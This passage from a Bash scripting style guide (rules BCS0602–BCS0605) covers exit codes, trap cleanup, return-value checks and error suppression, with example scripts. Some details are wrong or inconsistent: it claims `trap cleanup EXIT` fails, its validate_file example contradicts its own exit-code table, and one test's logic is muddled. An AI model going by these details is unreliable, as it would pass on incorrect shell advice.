set +e
result=$(failing_command)
set -e
if [[ -n "$result" ]]; then
  echo 'Now this works'
fi

# ✓ Alternative - check in conditional
if result=$(failing_command); then
  echo "Command succeeded: $result"
else
  echo 'Command failed, that's okay'
fi
```

**When to disable these flags:**
- Interactive scripts where user errors should be recoverable
- Scripts that intentionally try multiple approaches
- During cleanup operations that might fail

**Best practice:** Keep them enabled for most scripts. Disable only when absolutely necessary and re-enable immediately after.


---


**Rule: BCS0602**

## Exit Codes

Exit codes provide consistent error reporting across scripts. This is a **reference guide** - use integers directly or define constants as needed.

### Standard `die()` Function

```bash
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
```

**Usage patterns:**
```bash
# Direct integer (simplest)
die 3 'File not found'
die 22 'Invalid argument'

# With constants (clearer intent)
declare -i ERR_NOENT=3
die "$ERR_NOENT" "Config file not found ${file@Q}"
```

---

### BCS Canonical Exit Codes

#### Success

| Code | Name | Description |
|------|------|-------------|
| 0 | SUCCESS | Successful termination |

#### Core Errors (Bash convention)

| Code | Name | Description |
|------|------|-------------|
| 1 | ERR_GENERAL | General/unspecified error (catchall) |
| 2 | ERR_USAGE | Command line usage error |

#### File Operations

| Code | Name | Description | errno |
|------|------|-------------|-------|
| 3 | ERR_NOENT | No such file or directory | ENOENT=2 |
| 4 | ERR_ISDIR | Is a directory (expected file) | EISDIR=21 |
| 5 | ERR_IO | I/O error | EIO=5 |
| 6 | ERR_NOTDIR | Not a directory (expected dir) | ENOTDIR=20 |
| 7 | ERR_EMPTY | File/input is empty | - |

#### Arguments & Validation

| Code | Name | Description | errno |
|------|------|-------------|-------|
| 8 | ERR_REQUIRED | Required argument missing | - |
| 9 | ERR_RANGE | Value out of range | ERANGE=34 |
| 10 | ERR_TYPE | Wrong type/format | - |
| 22 | ERR_INVAL | Invalid argument | EINVAL=22 |

#### Permissions

| Code | Name | Description | errno |
|------|------|-------------|-------|
| 11 | ERR_PERM | Operation not permitted | EPERM=1 |
| 12 | ERR_READONLY | Read-only filesystem | EROFS=30 |
| 13 | ERR_ACCESS | Permission denied | EACCES=13 |

#### Resources

| Code | Name | Description | errno |
|------|------|-------------|-------|
| 14 | ERR_NOMEM | Out of memory | ENOMEM=12 |
| 15 | ERR_NOSPC | No space left on device | ENOSPC=28 |
| 16 | ERR_BUSY | Resource busy/locked | EBUSY=16 |
| 17 | ERR_EXIST | Already exists | EEXIST=17 |

#### Environment & Dependencies

| Code | Name | Description |
|------|------|-------------|
| 18 | ERR_NODEP | Missing dependency (command/library) |
| 19 | ERR_CONFIG | Configuration error |
| 20 | ERR_ENV | Environment error |
| 21 | ERR_STATE | Invalid state/precondition |

#### Network

| Code | Name | Description | errno |
|------|------|-------------|-------|
| 23 | ERR_NETWORK | General network error | - |
| 24 | ERR_TIMEOUT | Operation timed out | ETIMEDOUT=110 |
| 25 | ERR_HOST | Host unreachable/unknown | EHOSTUNREACH=113 |

---

### Reserved Ranges

| Range | Purpose |
|-------|---------|
| 64-78 | BSD sysexits.h (EX_USAGE=64, EX_CONFIG=78) |
| 126 | Command cannot execute (Bash) |
| 127 | Command not found (Bash) |
| 128+n | Fatal signal n (130=SIGINT, 137=SIGKILL, 143=SIGTERM) |

---

### Common Usage Examples

```bash
# File operations
[[ -f "$config" ]] || die 3 "Config not found ${config@Q}"
[[ -d "$dir" ]] || die 6 "Not a directory ${dir@Q}"
[[ -s "$input" ]] || die 7 "Input file is empty ${input@Q}"

# Argument validation
[[ -n "$required" ]] || die 8 'Required argument missing: --name'
((port >= 1 && port <= 65535)) || die 9 "Port out of range: $port"
[[ "$mode" =~ ^(read|write)$ ]] || die 22 "Invalid mode ${mode@Q}"

# Permissions
[[ -r "$file" ]] || die 13 "Cannot read ${file@Q}"
[[ -w "$dir" ]] || die 12 "Directory is read-only ${dir@Q}"

# Dependencies
command -v jq &>/dev/null || die 18 'Missing dependency: jq'
[[ -f "$config" ]] || die 19 'Configuration file missing'

# Network
curl -sf "$url" || die 24 "Request timed out: $url"
ping -c1 "$host" &>/dev/null || die 25 "Host unreachable: $host"
```

---

### Checking Exit Codes

```bash
if validate_input "$data"; then
  process "$data"
else
  case $? in
    8)  die 8 'Validation failed: missing required field' ;;
    9)  die 9 'Validation failed: value out of range' ;;
    22) die 22 'Validation failed: invalid format' ;;
    *)  die 1 'Validation failed: unknown error' ;;
  esac
fi
```

---

### Design Rationale

- **0-2 (Bash convention)**: Match standard shell behavior
- **3-25 (BCS custom)**: Logical groupings by error category
- **22 (EINVAL)**: Preserved at errno value - widely recognized
- **errno alignment**: Where practical (5, 13, 16, 17, 22) for familiarity
- **Avoid 64+**: Reserved for sysexits.h and signal codes

**Goal**: Consistency across scripts when the same error type occurs. Not a mandate - use what makes sense for your script.



---


**Rule: BCS0603**

## Trap Handling

**Standard cleanup pattern:**

```bash
cleanup() {
  local -i exitcode=${1:-0}

  # Disable trap during cleanup to prevent recursion
  trap - SIGINT SIGTERM EXIT

  # Cleanup operations
  [[ -n "$temp_dir" && -d "$temp_dir" ]] && rm -rf "$temp_dir" ||:
  [[ -n "$lockfile" && -f "$lockfile" ]] && rm -f "$lockfile" ||:

  # Log cleanup completion
  ((exitcode == 0)) && info 'Cleanup completed successfully' || warn "Cleanup after error (exit $exitcode)"

  exit "$exitcode"
}

# Install trap
trap 'cleanup $?' SIGINT SIGTERM EXIT
```

**Rationale for trap handling:**
- **Resource cleanup**: Ensures temp files, locks, processes are cleaned up even on errors
- **Signal handling**: Responds to Ctrl+C (SIGINT), kill (SIGTERM), and normal exit
- **Preserves exit code**: `$?` captures original exit status
- **Prevents partial state**: Cleanup runs regardless of how script exits

**Understanding trap signals:**

| Signal | Meaning | When Triggered |
|--------|---------|----------------|
| `EXIT` | Script exit | Always runs on script exit (normal or error) |
| `SIGINT` | Interrupt | User presses Ctrl+C |
| `SIGTERM` | Terminate | `kill` command (default signal) |
| `ERR` | Error | Command fails (with `set -e`) |
| `DEBUG` | Debug | Before every command (debugging only) |

**Common trap patterns:**

**1. Temp file cleanup:**
```bash
# Create temp file
temp_file=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp_file"' EXIT

# Script uses temp_file
echo "data" > "$temp_file"
# ...

# Cleanup happens automatically on exit
```

**2. Temp directory cleanup:**
```bash
# Create temp directory
temp_dir=$(mktemp -d) || die 1 'Failed to create temp directory'
trap 'rm -rf "$temp_dir"' EXIT

# Use temp directory
extract_archive "$archive" "$temp_dir"
# ...

# Directory automatically cleaned up on exit
```

**3. Lockfile cleanup:**
```bash
lockfile=/var/lock/myapp.lock

acquire_lock() {
  if [[ -f "$lockfile" ]]; then
    die 1 "Already running (lock file exists ${lockfile@Q})"
  fi
  echo $$ > "$lockfile" || die 1 "Failed to create lock file ${lockfile@Q}"
  trap 'rm -f "$lockfile"' EXIT
}

acquire_lock
# Script runs exclusively
# Lock released automatically on exit
```

**4. Process cleanup:**
```bash
# Start background process
long_running_command &
bg_pid=$!

# Ensure background process is killed on exit
trap 'kill $bg_pid 2>/dev/null' EXIT

# Script continues
# Background process killed automatically on exit
```

**5. Comprehensive cleanup function:**
```bash
#!/usr/bin/env bash
set -euo pipefail

# Global cleanup resources
declare -- temp_dir=''
declare -- lockfile=''
declare -i bg_pid=0

cleanup() {
  local -i exitcode=${1:-0}

  # Disable trap to prevent recursion
  trap - SIGINT SIGTERM EXIT

  # Kill background processes
  ((bg_pid)) && kill "$bg_pid" 2>/dev/null ||:

  # Remove temp directory
  if [[ -n "$temp_dir" && -d "$temp_dir" ]]; then
    rm -rf "$temp_dir" || warn "Failed to remove temp directory ${temp_dir@Q}"
  fi

  # Remove lockfile
  if [[ -n "$lockfile" && -f "$lockfile" ]]; then
    rm -f "$lockfile" || warn "Failed to remove lockfile ${lockfile@Q}"
  fi

  # Log exit
  if ((exitcode == 0)); then
    info 'Script completed successfully'
  else
    error "Script exited with error code: $exitcode"
  fi

  exit "$exitcode"
}

# Install trap EARLY (before creating resources)
trap 'cleanup $?' SIGINT SIGTERM EXIT

# Create resources
temp_dir=$(mktemp -d)
lockfile=/var/lock/myapp-"$$".lock
echo $$ > "$lockfile"

# Start background job
monitor_process &
bg_pid=$!

# Main script logic
main "$@"

# cleanup() called automatically on exit
```

**Multiple trap handlers (bash 3.2+):**
```bash
# Can combine multiple traps for same signal
trap 'echo "Exiting..."' EXIT
trap 'rm -f "$temp_file"' EXIT  # ✗ This REPLACES the previous trap!

# ✓ Correct - combine in one trap
trap 'echo "Exiting..."; rm -f "$temp_file"' EXIT

# ✓ Or use a cleanup function
trap 'cleanup' EXIT
```

**Trap execution order:**
```bash
# Traps execute in order: specific signal, then EXIT
trap 'echo "SIGINT handler"' SIGINT
trap 'echo "EXIT handler"' EXIT

# On Ctrl+C:
# 1. SIGINT handler runs
# 2. EXIT handler runs
# 3. Script exits
```

**Disabling traps:**
```bash
# Disable specific trap
trap - EXIT
trap - SIGINT SIGTERM

# Disable trap during critical section
trap - SIGINT  # Ignore Ctrl+C during critical operation
perform_critical_operation
trap 'cleanup $?' SIGINT  # Re-enable
```

**Trap gotchas and best practices:**

**1. Trap recursion prevention:**
```bash
cleanup() {
  # ✓ CRITICAL: Disable trap first to prevent recursion
  trap - SIGINT SIGTERM EXIT

  # If cleanup fails, trap won't trigger again
  rm -rf "$temp_dir"  # If this fails...
  exit "$exitcode"    # ...we still exit cleanly
}
```

**2. Preserve exit code:**
```bash
# ✓ Correct - capture $? immediately
trap 'cleanup $?' EXIT

# ✗ Wrong - $? may change between trigger and handler
trap 'cleanup' EXIT  # $? inside cleanup may be different
```

**3. Quote trap commands:**
```bash
# ✓ Correct - single quotes prevent early expansion
trap 'rm -f "$temp_file"' EXIT

# ✗ Wrong - double quotes expand variables now, not on trap
temp_file=/tmp/foo
trap "rm -f $temp_file" EXIT  # Expands to: trap 'rm -f /tmp/foo' EXIT
temp_file=/tmp/bar  # Trap still removes /tmp/foo!
```

**4. Set trap early:**
```bash
# ✓ Correct - set trap BEFORE creating resources
trap 'cleanup $?' EXIT
temp_file=$(mktemp)

# ✗ Wrong - resource created before trap installed
temp_file=$(mktemp)
trap 'cleanup $?' EXIT  # If script exits between these lines, temp_file leaks!
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - not preserving exit code
trap 'rm -f "$temp_file"; exit 0' EXIT  # Always exits with 0!

# ✓ Correct - preserve exit code
trap 'exitcode=$?; rm -f "$temp_file"; exit $exitcode' EXIT

# ✗ Wrong - using function without ()
trap cleanup EXIT  # Tries to run command named "cleanup"

# ✓ Correct - use function call syntax
trap 'cleanup $?' EXIT

# ✗ Wrong - complex cleanup logic inline
trap 'rm "$file1"; rm "$file2"; kill $pid; rm -rf "$dir"' EXIT

# ✓ Correct - use cleanup function
cleanup() {
  rm -f "$file1" "$file2"
  kill "$pid" 2>/dev/null
  rm -rf "$dir"
}
trap 'cleanup' EXIT
```

**Testing trap handlers:**

```bash
#!/usr/bin/env bash
set -euo pipefail

cleanup() {
  echo "Cleanup called with exit code: ${1:-?}"
  trap - EXIT
  exit "${1:-0}"
}

trap 'cleanup $?' EXIT

echo "Normal operation..."
# Test Ctrl+C: press Ctrl+C -> cleanup called
# Test error: false -> cleanup called with exit code 1
# Test normal: script ends -> cleanup called with exit code 0
```

**Summary:**
- **Always use cleanup function** for non-trivial cleanup
- **Disable trap inside cleanup** to prevent recursion
- **Set trap early** before creating resources
- **Preserve exit code** with `trap 'cleanup $?' EXIT`
- **Use single quotes** to delay variable expansion
- **Test thoroughly** with normal exit, errors, and signals


---


**Rule: BCS0604**

## Checking Return Values

**Always check return values of commands and function calls, providing informative error messages that include context about what failed. While `set -e` helps, explicit checking gives better control over error handling and messaging.**

**Rationale:**

- **Better Error Messages**: Explicit checks allow contextual error messages showing what operation failed
- **Controlled Recovery**: Some failures should trigger cleanup or fallback logic, not immediate exit
- **`set -e` Limitations**: `set -e` doesn't catch all failures (pipelines, command substitution, conditions)
- **Debugging Aid**: Explicit checks make it obvious which command failed
- **Partial Failure Handling**: Some operations can continue after non-critical failures
- **User Experience**: Informative errors help users understand what went wrong and how to fix it

**When `set -e` is not enough:**

```bash
# set -e doesn't catch these failures:

# 1. Commands in pipelines (except last)
cat missing_file.txt | grep pattern  # Doesn't exit if cat fails!

# 2. Commands in conditionals
if command_that_fails; then
  echo 'This runs even though command failed'
fi

# 3. Commands with || (already handled)
failing_command || echo 'Failed but continuing'

# 4. Command substitution in assignments
output=$(failing_command)  # Doesn't exit!
echo "$output"  # Empty, but script continues

# 5. Functions with explicit return
my_function() {
  return 1
}
my_function  # Exits with set -e
# But if used in conditional, doesn't exit:
if my_function; then
  echo 'Never reached'
fi
```

**Basic return value checking patterns:**

**Pattern 1: Explicit if check (most informative)**

```bash
# ✓ Best for critical operations needing context
if ! mv "$source_file" "$dest_dir/"; then
  error "Failed to move ${source_file@Q} to ${dest_dir@Q}"
  error 'Check permissions and disk space'
  exit 1
fi
```

**Pattern 2: || with die (concise)**

```bash
# ✓ Good for simple cases with one-line error
mv "$source_file" "$dest_dir/" || die 1 "Failed to move ${source_file@Q}"

# ✓ Can include variable context
cp "$config" "$backup" || die 1 "Failed to backup ${config@Q} to ${backup@Q}"
```

**Pattern 3: || with command group (for cleanup)**

```bash
# ✓ Good when failure requires cleanup
mv "$temp_file" "$final_location" || {
  error "Failed to move ${temp_file@Q} to ${final_location@Q}"
  rm -f "$temp_file"
  exit 1
}

# ✓ Multiple cleanup steps
process_file "$input" || {
  error "Processing failed: $input"
  restore_backup
  cleanup_temp_files
  return 1
}
```

**Pattern 4: Capture and check return code**

```bash
# ✓ When you need the return code value
local -i exit_code
command_that_might_fail
exit_code=$?

if ((exit_code != 0)); then
  error "Command failed with exit code $exit_code"
  return "$exit_code"
fi

# ✓ Different actions for different exit codes
wget "$url"
case $? in
  0) success "Download complete" ;;
  1) die 1 "Generic error" ;;
  2) die 2 "Parse error" ;;
  3) die 3 "File I/O error" ;;
  4) die 4 "Network failure" ;;
  *) die 1 "Unknown error code: $?" ;;
esac
```

**Pattern 5: Function return value checking**

```bash
# Define function with meaningful return codes
validate_file() {
  local -- file=$1

  [[ -f "$file" ]] || return 2  # Not found
  [[ -r "$file" ]] || return 5  # Permission denied
  [[ -s "$file" ]] || return 22 # Invalid (empty)

  return 0  # Success
}

# Check function return value
if validate_file "$config_file"; then
  source "$config_file"
else
  case $? in
    2)  die 2 "Config file not found ${config_file@Q}" ;;
    5)  die 5 "Cannot read config file ${config_file@Q}" ;;
    22) die 22 "Config file is empty ${config_file@Q}" ;;
    *)  die 1 "Config validation failed ${config_file@Q}" ;;
  esac
fi
```

**Edge case: Pipelines**

```bash
# Problem: set -e only checks last command in pipeline
cat missing_file | grep pattern  # Continues even if cat fails!

# ✓ Solution 1: Use PIPEFAIL (from set -euo pipefail)
set -o pipefail  # Now entire pipeline fails if any command fails
cat missing_file | grep pattern  # Exits if cat fails

# ✓ Solution 2: Check PIPESTATUS array
cat file1 | grep pattern | sort
if ((PIPESTATUS[0] != 0)); then
  die 1 'cat failed'
elif ((PIPESTATUS[1] != 0)); then
  info 'No matches found (grep returned non-zero)'
elif ((PIPESTATUS[2] != 0)); then
  die 1 'sort failed'
fi

# ✓ Solution 3: Avoid pipeline, use process substitution
grep pattern < <(cat file1)
```

**Edge case: Command substitution**

```bash
# Problem: Command substitution failure not caught
declare -- output
output=$(failing_command)  # Doesn't exit even with set -e!
echo "Output: $output"  # Empty

# ✓ Solution 1: Check after assignment
output=$(command_that_might_fail) || die 1 'Command failed'

# ✓ Solution 2: Explicit check in separate step
declare -- result
if ! result=$(complex_command arg1 arg2); then
  die 1 'complex_command failed'
fi

# ✓ Solution 3: Use set -e with inherit_errexit (Bash 4.4+)
shopt -s inherit_errexit  # Command substitution inherits set -e
output=$(failing_command)  # NOW exits with set -e
```

**Edge case: Conditional contexts**

```bash
# Commands in if/while/until don't trigger set -e

# Problem: This doesn't exit even with set -e
if some_command; then
  echo 'Command succeeded'
else
  echo 'Command failed but script continues'
fi

# ✓ Solution: Explicit check after conditional
if some_command; then
  process_result
else
  die $? 'some_command failed'
fi

# Or check return code
some_command
if (($?)); then
  die $? 'some_command failed'
fi
```

**Complete example with comprehensive error checking:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Messaging functions
error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
info() { echo "$SCRIPT_NAME: $*"; }

# Validate prerequisites
check_prerequisites() {
  local -- cmd
  local -a required_commands=(tar gzip sha256sum)

  info 'Checking prerequisites...'

  for cmd in "${required_commands[@]}"; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
      die 1 "Required command not found: $cmd"
    fi
  done

  info 'Prerequisites check passed'
}

# Create backup with error checking
create_backup() {
  local -- source_dir=$1
  local -- backup_file=$2
  local -- temp_file
  local -i exit_code

  info "Creating backup: $source_dir -> $backup_file"

  # Check source exists
  if [[ ! -d "$source_dir" ]]; then
    error "Source directory not found ${source_dir@Q}"
    return 2
  fi

  # Check destination writable
  if [[ ! -w "${backup_file%/*}" ]]; then
    error "Cannot write to directory '${backup_file%/*}'"
    return 5
  fi

  # Create backup with error handling
  temp_file="$backup_file".tmp

  # Create tar archive
  if ! tar -czf "$temp_file" -C "${source_dir%/*}" "${source_dir##*/}"; then
    error 'Failed to create tar archive'
    rm -f "$temp_file"
    return 1
  fi

  # Verify archive
  if ! tar -tzf "$temp_file" >/dev/null; then
    error 'Backup verification failed'
    rm -f "$temp_file"
    return 1
  fi

  # Move to final location
  if ! mv "$temp_file" "$backup_file"; then
    error 'Failed to move backup to final location'
    rm -f "$temp_file"
    return 1
  fi

  # Create checksum
  if ! sha256sum "$backup_file" > "$backup_file".sha256; then
    error 'Failed to create checksum'
    # Non-fatal - backup is still valid
    return 0
  fi

  info "Backup created successfully ${backup_file@Q}"
  return 0
}

# Process multiple files with return value checking
process_files() {
  local -a files=("$@")
  local -- file
  local -i success_count=0
  local -i fail_count=0

  for file in "${files[@]}"; do
    if create_backup "$file" /backup/"${file##*/}".tar.gz; then
      success_count+=1
      info "Success: $file"
    else
      fail_count+=1
      error "Failed: $file (return code: $?)"
    fi
  done

  info "Results: $success_count successful, $fail_count failed"

  # Return non-zero if any failures
  ((fail_count == 0))
}

main() {
  check_prerequisites

  local -a source_dirs=(/etc /var/log)

  if ! process_files "${source_dirs[@]}"; then
    die 1 'Some backups failed'
  fi

  info 'All backups completed successfully'
}

main "$@"
#fin
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - ignoring return values
mv "$file" "$dest"
# No check! If mv fails, script continues

# ✓ Correct - check return value
mv "$file" "$dest" || die 1 "Failed to move ${file@Q} to ${dest@Q}"

# ✗ Wrong - checking $? too late
command1
command2
if (($?)); then  # Checks command2, not command1!

# ✓ Correct - check immediately
command1
if (($?)); then
  die 1 'command1 failed'
fi
command2

# ✗ Wrong - generic error message
mv "$file" "$dest" || die 1 'Move failed'
# User has no idea what file or where!

# ✓ Correct - specific error message
mv "$file" "$dest" || die 1 "Failed to move ${file@Q} to ${dest@Q}"

# ✗ Wrong - not checking command substitution
checksum=$(sha256sum "$file")
# If sha256sum fails, checksum is empty but script continues!

# ✓ Correct - check command substitution
checksum=$(sha256sum "$file") || die 1 "Failed to compute checksum for ${file@Q}"

# ✗ Wrong - not cleaning up after failure
cp "$source" "$dest" || exit 1
# Might leave partial file at $dest!

# ✓ Correct - cleanup on failure
cp "$source" "$dest" || {
  rm -f "$dest"
  die 1 "Failed to copy ${source@Q} to ${dest@Q}"
}

# ✗ Wrong - assuming set -e catches everything
set -e
output=$(failing_command)  # Doesn't exit!
cat missing_file | grep pattern  # Doesn't exit if cat fails!

# ✓ Correct - explicit checks even with set -e
set -euo pipefail
shopt -s inherit_errexit
output=$(failing_command) || die 1 'Command failed'
cat file | grep pattern  # Now exits if cat fails (pipefail)
```

**Testing return value handling:**

```bash
# Test function return values
test_function_returns() {
  # Should return 0 for valid input
  validate_file "existing_file.txt"
  local -i result=$?
  ((result == 0)) || die 1 "Expected return 0, got $result"

  # Should return 2 for missing file
  validate_file missing_file.txt
  result=$?
  ((result == 2)) || die 1 "Expected return 2, got $result"

  info "Return value tests passed"
}

# Test error handling
test_error_handling() {
  # Should exit with error on failure
  if failing_operation; then
    die 1 'Expected failure but succeeded'
  fi

  info 'Error handling tests passed'
}
```

**Summary:**

- **Always check return values** of critical operations
- **Use `set -euo pipefail`** as baseline, but add explicit checks for control
- **Provide context** in error messages (what failed, with what inputs)
- **Check command substitution** results: `output=$(cmd) || die 1 "cmd failed"`
- **Use PIPEFAIL** to catch pipeline failures
- **Handle different exit codes** appropriately (0=success, 1=general error, 2=usage, etc.)
- **Clean up on failure** using `|| { cleanup; exit 1; }` pattern
- **Test error paths** to ensure failures are caught

**Key principle:** Defensive programming means assuming operations can fail. Check return values, provide informative errors, and handle failures gracefully. The extra lines of error checking prevent hours of debugging mysterious failures.


---


**Rule: BCS0605**

## Error Suppression

**Only suppress errors when the failure is expected, non-critical, and you have explicitly decided it's safe to continue. Always document WHY errors are being suppressed. Indiscriminate error suppression masks bugs and creates unreliable scripts.**

**Rationale:**

- **Masks Real Bugs**: Suppressing errors hides failures that should be fixed
- **Silent Failures**: Scripts appear to succeed while actually failing
- **Security Risk**: Ignored errors can leave systems in insecure states
- **Debugging Nightmare**: Suppressed errors make it impossible to diagnose problems
- **False Success**: Users think operation succeeded when it actually failed
- **Technical Debt**: Suppressed errors often indicate design problems that should be fixed

**When error suppression IS appropriate:**

**1. Checking if command exists (expected to fail):**

```bash
# ✓ Appropriate - failure is expected and non-critical
if command -v optional_tool >/dev/null 2>&1; then
  info 'optional_tool available'
else
  info 'optional_tool not found (optional)'
fi
```

**2. Checking if file exists (expected to fail):**

```bash
# ✓ Appropriate - testing existence, failure is expected
if [[ -f "$optional_config" ]]; then
  source "$optional_config"
else
  info "Using default configuration (no $optional_config)"
fi
```

**3. Cleanup operations (may fail if nothing to clean):**

```bash
# ✓ Appropriate - cleanup may have nothing to do
cleanup_temp_files() {
  # Suppress errors - temp files might not exist
  rm -f /tmp/myapp_* 2>/dev/null || true
  rmdir /tmp/myapp 2>/dev/null || true
}
```

**4. Optional operations with fallback:**

```bash
# ✓ Appropriate - md2ansi is optional, have fallback
if command -v md2ansi >/dev/null 2>&1; then
  md2ansi < "$file" || cat "$file"  # Fallback to cat
else
  cat "$file"  # md2ansi not available
fi
```

**5. Idempotent operations:**

```bash
# ✓ Appropriate - directory may already exist
install -d "$target_dir" 2>/dev/null || true

# ✓ Appropriate - user may already exist
id "$username" >/dev/null 2>&1 || useradd "$username"
```

**When error suppression is DANGEROUS:**

**1. File operations (usually critical):**

```bash
# ✗ DANGEROUS - if copy fails, script continues with missing file!
cp "$important_config" "$destination" 2>/dev/null || true

# ✓ Correct - check result and fail explicitly
if ! cp "$important_config" "$destination"; then
  die 1 "Failed to copy config to ${destination@Q}"
fi
```

**2. Data processing (silently loses data):**

```bash
# ✗ DANGEROUS - if processing fails, data is lost!
process_data < input.txt > output.txt 2>/dev/null || true

# ✓ Correct - check result
if ! process_data < input.txt > output.txt; then
  die 1 'Data processing failed'
fi
```

**3. System configuration (leaves system broken):**

```bash
# ✗ DANGEROUS - if systemctl fails, service is not running!
systemctl start myapp 2>/dev/null || true

# ✓ Correct - verify service started
systemctl start myapp || die 1 'Failed to start myapp service'
```

**4. Security operations (creates vulnerabilities):**

```bash
# ✗ DANGEROUS - if chmod fails, file has wrong permissions!
chmod 600 "$private_key" 2>/dev/null || true

# ✓ Correct - security operations must succeed
chmod 600 "$private_key" || die 1 "Failed to secure ${private_key@Q}"
```

**5. Dependency checks (script runs without required tools):**

```bash
# ✗ DANGEROUS - if git is missing, later commands will fail mysteriously!
command -v git >/dev/null 2>&1 || true

# ✓ Correct - fail early if dependency missing
command -v git >/dev/null 2>&1 || die 1 'git is required'
```

**Error suppression patterns:**

**Pattern 1: Redirect stderr to /dev/null**

```bash
# Suppress only error messages
command 2>/dev/null

# Use when: Error messages are noisy but you still check return value
if ! command 2>/dev/null; then
  error 'command failed'
fi
```

**Pattern 2: || true (ignore return code)**

```bash
# Make command always succeed
command1 || true
command2 ||:

# Use when: Failure is acceptable and you want to continue
rm -f /tmp/optional_file || true
```

**Pattern 3: Combined suppression**

```bash
# Suppress both errors and return code
command 2>/dev/null || true

# Use when: Both error messages and return code are irrelevant
rmdir /tmp/maybe_exists 2>/dev/null || true
```

**Pattern 4: Suppress with comment (ALWAYS document WHY)**

```bash
# Suppress errors for optional cleanup
# Rationale: Temp files may not exist, this is not an error
rm -f /tmp/myapp_* 2>/dev/null || true

# Suppress errors for idempotent operation
# Rationale: Directory may already exist from previous run
install -d "$cache_dir" 2>/dev/null || true
```

**Pattern 5: Conditional suppression**

```bash
# Only suppress in specific cases
if ((DRY_RUN)); then
  # In dry-run, operations are expected to fail
  actual_operation 2>/dev/null || true
else
  # In real mode, operations must succeed
  actual_operation || die 1 'Operation failed'
fi
```

**Complete example with appropriate suppression:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -- CACHE_DIR="$HOME"/.cache/myapp
declare -- LOG_FILE="$HOME"/.local/share/myapp/app.log

# Check for optional dependency (suppress is OK)
check_optional_tools() {
  # ✓ Safe to suppress - tool is optional
  if command -v md2ansi >/dev/null 2>&1; then
    info 'md2ansi available for formatted output'
    declare -g -i HAS_MD2ANSI=1
  else
    info 'md2ansi not found (optional)'
    declare -g -i HAS_MD2ANSI=0
  fi
}

# Check required dependency (DO NOT suppress)
check_required_tools() {
  # ✗ Do NOT suppress - tool is required
  if ! command -v jq >/dev/null 2>&1; then
    die 1 'jq is required but not found'
  fi
  info 'Required tools found'
}

# Create directories (suppress is OK for idempotent operation)
create_directories() {
  # ✓ Safe to suppress - directory may already exist
  # Rationale: install -d is idempotent, existing directory is not an error
  install -d "$CACHE_DIR" 2>/dev/null || true
  install -d "${LOG_FILE%/*}" 2>/dev/null || true

  # But verify they exist now
  [[ -d "$CACHE_DIR" ]] || die 1 "Failed to create cache directory ${CACHE_DIR@Q}"
  [[ -d "${LOG_FILE%/*}" ]] || die 1 "Failed to create log directory: ${LOG_FILE%/*}"
}

# Cleanup old files (suppress is OK)
cleanup_old_files() {
  info 'Cleaning up old files...'

  # ✓ Safe to suppress - files may not exist
  # Rationale: Cleanup is best-effort, missing files are not an error
  rm -f "$CACHE_DIR"/*.tmp 2>/dev/null || true
  rm -f "$CACHE_DIR"/*.old 2>/dev/null || true

  # ✓ Safe to suppress - directory may be empty or not exist
  # Rationale: rmdir only removes empty directories, failure is expected
  rmdir "$CACHE_DIR"/temp_* 2>/dev/null || true

  info 'Cleanup complete'
}

# Process data (DO NOT suppress)
process_data() {
  local -- input_file=$1
  local -- output_file=$2

  # ✗ Do NOT suppress - data processing errors are critical
  if ! jq '.data' < "$input_file" > "$output_file"; then
    die 1 "Failed to process ${input_file@Q}"
  fi

  # ✗ Do NOT suppress - validation must succeed
  if ! jq empty < "$output_file"; then
    die 1 "Output file is invalid ${output_file@Q}"
  fi

  info "Processed: $input_file -> $output_file"
}

main() {
  check_required_tools
  check_optional_tools
  create_directories
  cleanup_old_files

  # Process files (errors NOT suppressed)
  process_data input.json "$CACHE_DIR"/output.json

  info 'Processing complete'
}

main "$@"
#fin
```

**Anti-patterns to avoid:**

```bash
# ✗ WRONG - suppressing critical operation
cp "$important_file" "$backup" 2>/dev/null || true
# If cp fails, you have no backup but script continues!

# ✓ Correct - check critical operations
cp "$important_file" "$backup" || die 1 'Failed to create backup'

# ✗ WRONG - suppressing without understanding why
some_command 2>/dev/null || true
# Why are we suppressing? Is this safe?

# ✓ Correct - document reason for suppression
# Suppress errors: temp directory may not exist (non-critical)
rmdir /tmp/myapp 2>/dev/null || true

# ✗ WRONG - suppressing all errors in function
process_files() {
  # ... many operations ...
} 2>/dev/null
# This suppresses ALL errors in function - extremely dangerous!

# ✓ Correct - only suppress specific operations
process_files() {
  critical_operation || die 1 'Critical operation failed'
  optional_cleanup 2>/dev/null || true  # Only this is suppressed
}

# ✗ WRONG - using set +e to suppress errors
set +e
critical_operation
set -e
# Disables error checking for entire block!

# ✓ Correct - use || true for specific command
critical_operation || {
  error 'Operation failed but continuing'
  # Decided this is safe to ignore in this context
  true
}

# ✗ WRONG - suppressing in production but not development
if [[ "$ENV" == production ]]; then
  operation 2>/dev/null || true
else
  operation
fi
# If it fails in production, you need to know!

# ✓ Correct - same error handling everywhere
operation || die 1 'Operation failed'
```

**Testing error suppression:**

```bash
# Verify suppression is appropriate
test_error_suppression() {
  # Test that suppressed operation actually might fail
  rm -f /nonexistent/file 2>/dev/null || true

  # Verify this didn't break anything
  [[ -d /tmp ]] || die 1 'Suppressed operation broke system!'

  # Test that non-suppressed operations are checked
  if ! cp /etc/passwd /tmp/test_passwd 2>&1; then
    info 'Correctly detected failure'
  else
    die 1 'Should have failed without /tmp write permission'
  fi

  rm -f /tmp/test_passwd
}
```

**Summary:**

- **Only suppress** when failure is expected, non-critical, and safe to ignore
- **Always document** WHY errors are suppressed (comment above suppression)
- **Never suppress** critical operations (data, security, required dependencies)
- **Use `|| true`** to ignore return code while keeping stderr visible
